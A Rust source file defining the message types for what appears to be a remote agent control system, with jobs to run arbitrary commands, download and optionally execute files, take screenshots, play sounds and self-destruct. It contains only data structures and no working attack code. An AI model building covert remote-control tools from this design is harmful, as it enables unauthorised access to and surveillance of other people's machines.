use std::fmt::{Debug};
use std::net::SocketAddr;
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::errors::JobErrors;

#[derive(Deserialize, Serialize, Debug)]
pub struct Job {
    pub id: u16,
    pub job_type: JobType,
    pub timeout: Duration,
}

#[derive(Deserialize, Serialize, Debug)]
pub struct TargetJob {
    pub socket_addr: SocketAddr,
    pub job_type: JobType,
    pub timeout: Duration,
}

#[derive(Deserialize, Serialize)]
pub struct JobResult {
    pub id: u16,
    pub job_output: Result<JobOutput, JobErrors>,
}


#[derive(Deserialize, Serialize, Debug, Default)]
pub struct Agents {
    pub socket_addrs: Vec<SocketAddr>,
}


#[derive(Deserialize, Serialize, Debug, Default)]
pub struct CommandPayload {
    pub command: String,
    pub args: Vec<String>,
}

#[derive(Deserialize, Serialize, Debug)]
pub struct DownloadPayload {
    pub url: String,
    pub execute: bool,
}

#[derive(Deserialize, Serialize, Debug)]
pub struct SoundPayload {
    pub url: String,
}

#[derive(Deserialize, Serialize, Debug)]
pub enum JobType {
    Command(CommandPayload),
    DownloadFile(DownloadPayload),
    PlaySound(SoundPayload),
    ScreenShot,
    SelfDestruct,
}


#[derive(Deserialize, Serialize)]
pub enum JobOutput {
    Command(Result<CommandOutput, JobErrors>),
    DownloadFile(Result<DownloadFileOutput, JobErrors>),
    PlaySound(Result<PlaySoundOutput, JobErrors>),
    ScreenShot(Result<ScreenShotOutput, JobErrors>),
}

impl Default for JobOutput {
    fn default() -> Self {
        JobOutput::Command(Ok(CommandOutput { output: "".to_string() }))
    }
}

#[derive(Deserialize, Serialize)]
pub struct CommandOutput {
    pub output: String,
}

#[derive(Deserialize, Serialize)]
pub struct DownloadFileOutput {
    pub path: String,
}

#[derive(Deserialize, Serialize)]
pub struct PlaySoundOutput {}

#[derive(Deserialize, Serialize)]
pub struct ScreenShotOutput {
    pub url: String,
}